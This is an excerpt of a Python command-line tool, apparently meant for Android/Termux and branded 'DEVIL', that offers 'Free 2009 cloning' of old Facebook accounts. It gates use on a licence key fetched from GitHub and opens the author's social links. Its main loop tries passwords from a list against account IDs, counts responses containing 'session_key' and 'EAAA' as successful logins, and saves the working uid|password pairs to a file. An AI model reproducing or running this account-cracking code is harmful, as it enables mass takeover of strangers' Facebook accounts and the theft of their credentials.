...
def logo():
 ...
 ───────────────────────────────────────────────────────×
  ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m DEVIL\x1b[0m\x1b[1;97m]
...
\033[1;32m╚══════════════════════════════════════════════════════════╝
\033[1;32m╔══════════════════════════════════╗╔══════════════════════╗
\033[1;32m║NOTE : \033[37;41mOLD ID TOOL\033[0;m\033[1;32m          ║║        \x1b[1;91m___T_\033[1;32m         ║
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/DEVIL-NAJMUL/Old/blob/main/approval.txt"])
	#yahan apni facebook id link dalna
	exit(" [=>] FACEBOOK :  https://www.facebook.com/N41M01")
...
def notice():
	...
	runtxt("\n\033[0;97m  Free 2009 cloning 1st JOIN OUR GROUP ")
	...
	subprocess.check_output(["am", "start", "https://www.facebook.com/N41M01"])
...
class Main:
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://github.com/DEVIL-NAJMUL/Old/blob/main/approval.txt').text
			if basesplit in plr:
				key = basesplit
...
\033[1;32m╚══════════════════════════════════════════════════════════╝"""
		...
		subprocess.check_output(["am", "start", "https://www.facebook.com/nLN41M01"])
		print("───────────────────────────────────────────────────────× ")
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[1;32m[𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-DEVIL]%s | %s\033[1;32m         "%(uid, pw))
				print ("\r \033[1;32m Congrats ")
				self.ok.append("%s|%s"%(uid, pw))
				open("𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-DEVIL.txt","a").write(" %s|%s\n"%(uid, pw))
				break
...
if len(sys.argv) == 2:
	if sys.argv[1] == "--info":
		...
		print(" [*] Team      :  \n") 
		print(" [ Sosial Medi  ] \n")
		print(" [*] Facebook  : https://facebook.com/N41M01 ")
		print(" [*] Instagram : https://instagram.com/ ")
		print(" [*] YouTube   : https://youtube.com/ ")
		exit(" [*] GitHub    : https://github.com/N41M01")
	else:
		Main()
